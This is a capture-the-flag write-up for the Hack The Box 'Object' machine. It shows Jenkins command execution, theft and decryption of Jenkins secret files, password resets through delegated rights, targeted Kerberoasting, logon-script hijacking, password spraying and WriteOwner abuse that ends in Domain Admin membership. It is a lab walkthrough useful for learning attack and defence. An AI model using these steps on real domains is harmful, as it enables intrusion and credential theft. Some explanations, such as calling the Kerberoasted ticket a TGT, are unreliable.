---
title: HTB-Object
draft: false
tags:
  - htb
  - windows
  - active-directory
  - jenkins
  - firewall
  - firewall-enum
  - jenkins-password
  - bloodhound
  - forcechangepassword
  - powerview-ps1
  - targeted-kerberoasting
  - genericwrite
  - logon-script
  - writeowner
  - hard
---
![](https://i.imgur.com/60RZofd.png)

## Information Gathering
### Rustscan

Rustscan finds HTTP, WInRM, and port 8080 http open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/object]
└─$ sudo rustscan --addresses 10.10.11.132 --range 1-65535
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------
😵 https://admin.tryhackme.com
[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
<snip>

PORT STATE SERVICE REASON
80/tcp open http 
5985/tcp open wsman 
8080/tcp open http-proxy
  
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.87 seconds
Raw packets sent: 32 (1.384KB) | Rcvd: 16 (688B)
```
## Enumeration
### HTTP - TCP 80
The website shows a page running on IIS 10.0: 

![](https://i.imgur.com/6Zv5wUt.png)


Underlined **automation** leads me to **http://object.htb:8080**, which I add to `/etc/hosts`.

### HTTP - TCP 8080
The website shows **Jenkins** login page:

![](https://i.imgur.com/jtsSo0m.png)


There's a feature for creating an account so I will create one as user **jadu**:

![](https://i.imgur.com/Ssqoyi1.png)


At the bottom right side of the page, Jenkins version is shown: **2.317**

![](https://i.imgur.com/67Tthfn.png)


`/asynchPeople` shows you the list of users and for this case, I only see **admin** other than user **jadu**:

![](https://i.imgur.com/mzaZw8p.png)



## Exploitation
### Jenkins RCE
Going to `/newJob` will allow me to create a new item on Jenkins:

![](https://i.imgur.com/6y0d8Di.png)


Using **Freestyle project**, I can inject a script that will run on Windows system by clicking on **Execute Windows batch command** under **Build**:

![](https://i.imgur.com/doIS4ts.png)


First to confirm that command execution actually works, I will execute simple `whoami` command:

![](https://i.imgur.com/42KgQSt.png)



Through out some previous trials, I discovered that user jadu has no right to build the created pipeline.

However, using **Schedule**, I can build the pipeline automatically every one minute as such:

![](https://i.imgur.com/RMxidoG.png)


After saving the pipeline, I can see that the command `whoami` was successfully executed through **Console Output**:

![](https://i.imgur.com/x9XDrea.png)


## Shell as oliver
### Firewall

I tried uploading netcat.exe to the system for a reverse shell but there seems to be an error with it. I will check on Firewall setting to see what is the issue:

`cmd.exe /c netsh advfirewall show allprofiles`

![](https://i.imgur.com/B64e4Zh.png)



Based on the output, for all three profiles (Domain, Private, and Public), the firewall policy is set to block inbound connections and allow outbound connections. Additionally, logging for both allowed and dropped connections is disabled, and the firewall log file is set with a maximum size of 4096 bytes:


![](https://i.imgur.com/hDRQM2t.png)


However, if we specify the firewall to **Outbound**, it shows blocked:

`cmd.exe /c powershell.exe -c Get-NetFirewallRule -Action Block -Enabled True -Direction Outbound`

![](https://i.imgur.com/iQIQLw8.png)


This is probably why all my attempts on spawning reverse shell failed.

### Retrieve Jenkins Password

Instead of going for Reverse Shell connection, I will try searching for Jenkins Credentials. 

Listing `\Users\oliver\AppData\local\jenkins\.jenkins\users` shows two interesting directories, one **admin** and another **jadu** which is current user:

`cmd.exe /c "dir C:\Users\oliver\AppData\local\jenkins\.jenkins\users`

![](https://i.imgur.com/1Ki7IKE.png)

Inside admin folder, there is **config.xml**:

`cmd.exe /c "dir C:\Users\oliver\AppData\local\jenkins\.jenkins\users\admin_17207690984073220035`

![](https://i.imgur.com/30dISaC.png)


I can view **config.xml** file but it is hashed with **bcrypt** algorithm:

`cmd.exe /c "type C:\Users\oliver\AppData\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml"`

![](https://i.imgur.com/ZLQkh15.png)


```hash
<passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
```


### Cracking Hash
[Jenkins-Credentials-Decryptor](https://github.com/hoto/jenkins-credentials-decryptor)tells me that **credentials.xml**(or config.xml), **master.key** and **hudson.util.Secret** is required for the decryption:

![](https://i.imgur.com/WEtMSio.png)


From some enumeration, I discovered paths to required files:


```paths
c:\users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret
c:\users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key
c:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml
```

Using the command below, I can retrieve **master.key** and **hudson.util.secret**:

```powershell
cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key"
powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path
'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding
byte));Write-Output $c"
```


Using the python script above, I will decrypt the password hash:

```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret credentials.xml
```

It decrypts and provides me the password for **oliver**: **c1cdfun_d2434**


### Evil-Winrm

Using the found credentials and Evil-Winrm, now I have a shell connection as **oliver**:

![](https://i.imgur.com/kN6d6BN.png)


## Privesc: oliver to smith

Oliver is the member of the **Domain Users** which is very interesting:

`net user oliver`

![](https://i.imgur.com/9lgRdz5.png)


I will upload **SharpHound.exe** through `upload SharpHound.exe` command and run it to enumerate the environment. After running SharpHound.exe, zip file is created to be downloaded:


![](https://i.imgur.com/M77tw82.png)


After downloading the zip file, I will get Bloodhound ready:

```bash
sudo neo4j console
sudo bloodhound
```

After drag & dropping the zip file to Bloodhound, I will first mark account **oliver** as owned:

![](https://i.imgur.com/agSAQYw.png)


### ForceChangePassword

There is one outbound first degree object control right from **oliver** to account **smith**: 

![](https://i.imgur.com/kweKjD1.png)


The user OLIVER@OBJECT.LOCAL has the capability to change the user SMITH@OBJECT.LOCAL's password without knowing that user's current password.

I will first upload **PowerView.ps1** to the system and run it

![](https://i.imgur.com/2xXEhFS.png)


Using the commands below, I can change the password for user **smith** into **Password123!**:

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

Set-DomainUserPassword -Identity smith -AccountPassword $SecPassword
```

![](https://i.imgur.com/UOfOUyO.png)


### Evil-Winrm

Now with the new password, I can sign-in as **smith**:

`sudo evil-winrm -i 10.10.11.132 -u smith -p 'Password123!'`

![](https://i.imgur.com/tmecbPN.png)


## Privesc:smith to maria
### GenericWrite Abuse

The user SMITH@OBJECT.LOCAL has generic write access to the user MARIA@OBJECT.LOCAL.

![](https://i.imgur.com/q4vuD4v.png)



> Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user

> To abuse GenericWrite, we have 2 options. One, we can set a service principal name and we can kerberoast that account. Two, we can set objects like logon script which would get executed on the next time account logs in.

#### Method 1: Targeted Kerberoasting

> An **SPN** is a unique identifier for a service running on a server within a Windows domain. It usually takes the form of *service/hostname*, where "**service**" represents the service type (e.g., HTTP, MSSQL) and "**hostname**" is the hostname of the server where the service runs.

> By modifying the SPN of a user account to include a service that the attacker controls (e.g., an HTTP service running on a rogue server), the attacker can trick the KDC into issuing a TGT encrypted with the user's password hash when someone requests a Kerberos ticket for the malicious SPN.




I will upload **PowerView.ps1** once more:

![](https://i.imgur.com/kRu1ZL5.png)


I will import it using `Import-Module .\PowerView.ps1`

![](https://i.imgur.com/KNsEDg3.png)


I can query information regarding user **maria**:

`Get-DomainObject -Identity maria`

![](https://i.imgur.com/Rq3fa6J.png)


I will first test if I can change the SPN for account **maria** using the commands below:

```powershell
Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/jadu'}
Get-DomainUser maria | Select serviceprincipalname
```

![](https://i.imgur.com/Qr4bnrO.png)


I can confirm that SPN for user **maria** has just changed to the value what I set.

In order for the Kerberoasting to work, I need valid SPN name instead of something like **nonexistent/jadu**.


This time, instead of using **Set-DomainObject**, I will use **setspn** to set the SPN for user maria:

`setspn -a MSSQLSvc/object.local:1433 object.local\maria`

![](https://i.imgur.com/5kNA4p5.png)


I can confirm new SPN with the following command:

`Get-DomainUser maria | Select serviceprincipalname`

![](https://i.imgur.com/9sz68rK.png)


PowerView has **Get-DomainSPNTicket** to Kerberoast, but it actually requires a credential object (*even though I am logged in as smith*):

`Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433"`

![](https://i.imgur.com/Y1dxHR0.png)


The error message is about the credentials being invalid. I’ll create a credential object:

```powershell
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $pass)

Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433" -Credential $cred
```

Above provides hash for account **maria** but it is not crackable:


![](https://i.imgur.com/fNgubzQ.png)


Alternatively, I can also use **rubeus.exe** for kerberoasting as such:

```powershell
.\rubeus.exe kerberoast /creduser:object.local\smith /credpassword:Password123!
```




#### Method 2: logon script

> In Active Directory, a **logon script** is a batch file or script that is executed automatically when a user logs into a Windows domain.

> The logon script setting is stored as an attribute of user objects in Active Directory.

> An attacker with the GenericWrite permission could modify the logon script setting of a target user account to point to a malicious script hosted on a server under their control.

> The attacker could then wait for the targeted user to log in to their domain account. Upon login, the system would execute the modified logon script.

As always, I will first prepare credentials for user **smith** as such:

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $SecPassword)
```

Now using the commands below, I can set the logon script to **foo.ps1** which will forward result of `whoami` to `C:\\Windows\\System32\\spool\\drivers\\color\\poc.txt`:

```powershell
cd C:\\Windows\\System32\\spool\\drivers\\color

echo 'whoami > C:\\Windows\\System32\\spool\\drivers\\color\\poc.txt' > foo.ps1

Set-DomainObject -Credential $Cred -Identity maria -SET @{scriptpath='C:\\Windows\\System32\\spool\\drivers\\color\\foo.ps1'}
```

Through `net usr maria`, I can see that Logon script is set properly as **foo.ps1**:

![](https://i.imgur.com/EpX9rqI.png)


**poc.txt** confirms that `whoami` command was succssfully executed as a Logon script:

![](https://i.imgur.com/oTWoOL6.png)


Now I will create a script that will list files inside **maria**'s user directory:

`echo 'dir c:\Users\maria\Desktop > c:\\Windows\\System32\\spool\\drivers\\color\\poc.txt' > foo.ps1`

Checking on the result, it shows that there is **Engines.xls** file inside maria's desktop:

![](https://i.imgur.com/o7NrXAT.png)



I will copy **Engines.xls** file over to accessible diretory path to read it:

`echo 'copy \users\maria\desktop\Engines.xls c:\\Windows\\System32\\spool\\drivers\\color\\' > foo.ps1`

Now I can see that **Engines.xls** has been copied:

![](https://i.imgur.com/KBr8jiy.png)


After downloading **Engines.xls** using `download Engines.xls`, I can open it on local Kali machine:

![](https://i.imgur.com/CPCfpyH.png)


### Password Spraying
I will attempt on password spray using three passwords found:

- d34gb8@
- 0de_434_d545
- W3llcr4ft3d_4cls

Crackmapexec discovers one valid password: **W3llcr4ft3d_4cls**

`crackmapexec winrm 10.10.11.132 -u maria -p pass.txt `

![](https://i.imgur.com/ch7HBfX.png)


Now I have evil-winrm shell as user maria:

![](https://i.imgur.com/R98bdsr.png)



## Privesc: maria to Domain Admis
### WriteOwner Abuse
The user MARIA@OBJECT.LOCAL has the ability to modify the owner of the group DOMAIN ADMINS@OBJECT.LOCAL.

Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL.

![](https://i.imgur.com/RS6giYY.png)


I will first create a PSCredential object:

```powershell
$SecPassword = ConvertTo-SecureString 'W3llcr4ft3d_4cls' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('object.local\maria', $SecPassword)
```

Once again, I will upload PowerView.ps1 using `upload PowerView.ps1` and import it using `Import-Module .\PowerView.ps1`.


Using **Set-DomainObejctOwner**, I will set **maria** as the owner of **Domain Admins**. After that, I use **Add-DomainObjectAcl** to grant **maria** all the rights. Finally I will add **maria** to **Domain Admins**:

```powershell
Set-DomainObjectOwner -Credential $Cred -Identity "Domain Admins" -OwnerIdentity maria

Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All -Verbose

net group "Domain Admins" maria /add
```

I can confirm the above process using the command below:

`Get-DomainGroupMember -Identity 'Domain Admins'`

![](https://i.imgur.com/QnC09UT.png)


Accessing evil-winrm again after exit grants me full privilege"

![](https://i.imgur.com/Ba2y8aU.png)


## References
- https://github.com/morph3/writeups/tree/main/htb-unictf-quals-2021/fullpwn/object#kerberoasting
- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
